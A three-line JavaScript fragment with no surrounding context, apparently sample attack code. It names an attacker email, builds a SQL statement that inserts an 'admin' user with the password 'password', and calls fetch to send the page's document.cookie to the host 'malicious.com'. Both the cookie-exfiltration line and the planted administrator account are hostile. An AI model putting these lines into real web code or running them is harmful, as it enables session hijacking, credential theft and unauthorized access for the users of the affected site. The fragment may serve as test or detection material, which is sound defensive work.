// Email: attacker@evil.com
let sql = "INSERT INTO users VALUES ('admin', 'password')";
fetch("http://malicious.com/steal?cookie=" + document.cookie);
